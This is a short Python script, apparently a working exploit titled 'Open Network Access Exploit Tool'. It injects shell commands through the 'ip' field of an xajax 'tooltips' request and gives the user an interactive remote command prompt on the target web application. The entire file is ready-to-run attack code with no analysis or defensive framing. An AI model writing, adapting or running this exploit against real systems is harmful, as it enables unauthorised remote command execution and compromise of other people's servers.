#!/usr/bin/env python3

import requests, cmd, sys
from string import ascii_letters
from random import choice

def sendRequest(url, command):

	start = ''.join(choice(ascii_letters) for i in range(10))
	end = ''.join(choice(ascii_letters) for i in range(10))
	postData = {'xajax':'window_submit',
	'xajaxargs[]':['tooltips',f'ip=>;echo "{start}";{command} 2>&1;echo "{end}"','ping']
    }

	try:
		response = requests.post(url, data=postData).text
	except Exception as e:
		print(f'[-] Error: Cannot reach target.\n{str(e)}')
		quit()

	try:
		return response.split(start)[1].split(end)[0].rstrip().lstrip()
	except:
		return '[-] Error: No valid response to command recieved.'

def usage():
	print('Usage:')
	print('onaexploit.py <address>')
	quit()

print('Open Network Access Exploit Tool')

if len(sys.argv) != 2 or sys.argv[1] == '-h' or sys.argv[1] == '--help':
	usage()

url = sys.argv[1]
if url[-1] != '/':
	url += '/'

class cmdPrompt(cmd.Cmd):
	prompt = '\n' + sendRequest(url, 'pwd') + '$ '
	
	def default(self, line):

		if line != 'exit':
			print(sendRequest(url, line))
		else:
			quit()


cmdPrompt().cmdloop()
